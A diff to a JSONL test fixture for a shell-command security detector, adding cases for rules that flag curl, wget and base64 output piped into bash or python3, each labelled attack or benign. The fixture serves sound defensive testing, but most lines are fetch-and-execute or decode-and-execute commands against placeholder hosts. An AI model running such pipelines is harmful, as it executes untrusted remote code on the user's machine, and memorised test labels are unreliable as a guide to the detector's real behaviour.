@@ -43,6 +43,12 @@
 {"id":"curl-head-pipeline","rule_id":"CMD-PIPE-CURL","command":"curl -sI https://files.invalid/install.sh | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"curl-config-pipeline","rule_id":"CMD-PIPE-CURL","command":"curl -K curl.conf https://files.invalid/install.sh | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"curl-unknown-option-pipeline","rule_id":"CMD-PIPE-CURL","command":"curl --future-mode https://files.invalid/install.sh | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
+{"id":"curl-remote-name-all-after-target-execute","rule_id":"CMD-PIPE-CURL","command":"curl https://files.invalid/install.sh --remote-name-all | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
+{"id":"curl-remote-name-all-before-target","rule_id":"CMD-PIPE-CURL","command":"curl --remote-name-all https://files.invalid/install.sh --no-remote-name-all | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
+{"id":"curl-singular-no-remote-name-execute","rule_id":"CMD-PIPE-CURL","command":"curl --remote-name-all --no-remote-name https://one.invalid/install.sh https://two.invalid/archive | bash","is_attack":true,"expect_route":"fallback","no_other_finding":true}
+{"id":"curl-trailing-empty-next-execute","rule_id":"CMD-PIPE-CURL","command":"curl https://files.invalid/install.sh --next | bash","is_attack":true,"expect_route":"fallback","no_other_finding":true}
+{"id":"curl-leading-empty-next","rule_id":"CMD-PIPE-CURL","command":"curl --next https://files.invalid/install.sh | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
+{"id":"curl-interior-empty-next","rule_id":"CMD-PIPE-CURL","command":"curl https://one.invalid/install.sh --next --next https://two.invalid/install.sh | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"curl-json-transform","rule_id":"CMD-PIPE-CURL","command":"curl https://api.invalid/data | jq .","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"wget-python-stdin-execute","rule_id":"CMD-PIPE-WGET","command":"wget -qO- https://files.invalid/install.py | python3 -","is_attack":true,"expect_route":"semantic","no_other_finding":true}
 {"id":"wget-server-response-shell-execute","rule_id":"CMD-PIPE-WGET","command":"wget -SO- https://files.invalid/install.sh | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
@@ -51,10 +57,14 @@
 {"id":"wget-local-python-script","rule_id":"CMD-PIPE-WGET","command":"wget -qO- https://files.invalid/input.txt | python3 local.py","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"base64-decode-execute","rule_id":"CMD-PIPE-BASE64","command":"base64 -d | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
 {"id":"base64-portable-input-execute","rule_id":"CMD-PIPE-BASE64","command":"base64 -d -i payload.b64 | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
+{"id":"base64-portable-input-before-decode-execute","rule_id":"CMD-PIPE-BASE64","command":"base64 -i payload.b64 --decode | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
 {"id":"base64-file-pipeline-partial-sibling","rule_id":"CMD-PIPE-BASE64","command":"base64 -d -i payload.b64 | bash; future-command --unknown-mode","is_attack":true,"expect_route":"fallback","no_other_finding":true}
+{"id":"base64-bundled-input-partial-sibling","rule_id":"CMD-PIPE-BASE64","command":"base64 -ddi payload.b64 | bash; future-command --unknown-mode","is_attack":true,"expect_route":"fallback","no_other_finding":true}
+{"id":"base64-bundled-input-missing-operand-partial-sibling","rule_id":"CMD-PIPE-BASE64","command":"base64 -ddi | bash; future-command --unknown-mode","is_attack":false,"expect_route":"none","no_other_finding":true}
+{"id":"base64-uppercase-decode-partial-sibling","rule_id":"CMD-PIPE-BASE64","command":"base64 -D payload.b64 | bash; future-command --unknown-mode","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"base64-positional-input-pipeline","rule_id":"CMD-PIPE-BASE64","command":"base64 -d payload.b64 | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"base64-decode-file","rule_id":"CMD-PIPE-BASE64","command":"base64 --decode payload.b64 > payload.sh","is_attack":false,"expect_route":"none","no_other_finding":true}
-{"id":"base64-ambiguous-bundle","rule_id":"CMD-PIPE-BASE64","command":"base64 -di payload.b64 | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
+{"id":"base64-bundled-portable-input-execute","rule_id":"CMD-PIPE-BASE64","command":"base64 -di payload.b64 | bash","is_attack":true,"expect_route":"semantic","no_other_finding":true}
 {"id":"base64-input-flag-no-operand","rule_id":"CMD-PIPE-BASE64","command":"base64 -d -i | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"base64-nonportable-ignore-garbage","rule_id":"CMD-PIPE-BASE64","command":"base64 -d --ignore-garbage payload.b64 | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
 {"id":"base64-nonportable-uppercase-decode","rule_id":"CMD-PIPE-BASE64","command":"base64 -D payload.b64 | bash","is_attack":false,"expect_route":"none","no_other_finding":true}
